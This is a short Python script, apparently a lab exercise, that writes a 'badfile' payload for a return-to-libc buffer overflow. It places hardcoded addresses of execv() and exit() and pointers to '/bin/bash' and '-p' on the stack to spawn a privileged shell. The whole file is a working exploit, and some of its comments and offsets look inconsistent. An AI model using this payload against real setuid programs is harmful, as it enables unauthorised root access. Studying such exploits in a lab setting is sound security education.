#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

Y = 64 
execv_addr = 0xf7e90420  # The address of execv() this shouldn't change. 
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = 68 
exit_addr = 0xf7dfbec0 # The address of exit() this shouldn't change.
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')



X = 0 
sh_addr = 0xffffd426 #  /bin/dash
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')


#content[X+4:X+8] = (sh_addr).to_bytes(4,byteorder='little')
#have to call /bin/bash twice

C = 4 
p_addr = 0xffffd62c
content[C:C+4] = (p_addr).to_bytes(4,byteorder='little')
# -p


content[900:900+4] = (0).to_bytes(4,byteorder='little') #this is 4 null bytes, but it is outside of strcpy.

CC = 72
start_of_buf = 0xffffd426  #first param literal string /bin/bash 
content[CC:CC+4] = (start_of_buf).to_bytes(4,byteorder='little')

DD = 76 
dd_addr = 0xffffd426 # /bin/bash string too
content[DD:DD+4] = (dd_addr).to_bytes(4,byteorder='little')

EE = 80
ee_addr = 0xffffd62c # -p
content[EE:EE+4] = (ee_addr).to_bytes(4,byteorder='little')

FF = 84
ff_addr = 0xffffd0e0 # NULL bytes 
content[FF:FF+4] = (ff_addr).to_bytes(4,byteorder='little')




with open("badfile", "wb") as f:
  f.write(content)
